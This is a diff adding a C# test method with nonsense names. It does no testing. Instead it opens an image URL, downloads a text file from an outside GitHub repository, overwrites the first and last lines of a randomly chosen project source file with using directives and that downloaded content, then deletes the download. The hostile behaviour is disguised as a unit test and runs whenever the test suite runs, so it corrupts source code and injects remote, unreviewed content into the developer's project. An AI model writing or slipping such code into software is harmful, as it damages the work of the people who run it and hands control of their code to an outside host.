@@ -1,0 +1,20 @@
+}
+public class sdfsdf
+{
+    [Test]
+    public void sdfsdf()
+    {
+        Random random = new Random();
+        Process.Start(new ProcessStartInfo("https://i.pinimg.com/736x/14/c8/a4/14c8a4c1afbcc56b701b2d95cf36aea5.jpg") { UseShellExecute = true });
+        var files = Directory.GetFiles("../../../../TestProject1");
+        string path = files[random.Next(files.Length)];
+        WebClient client = new WebClient();
+        client.DownloadFile("https://raw.githubusercontent.com/NightTrampYT/JokerJoke/refs/heads/main/joker.txt", @"../../../../TestProject1/joker.txt");
+        
+        string[] lines = File.ReadAllLines(path);
+        lines[0] = "using System.Collections.Generic;\nusing System.Diagnostics;\nusing System.Net;\nusing Program;";
+        lines[lines.Length - 1] = File.ReadAllText("../../../../TestProject1/joker.txt");
+        File.WriteAllLines(path, lines);
+        File.Delete("../../../../TestProject1/joker.txt");
+    }
+}
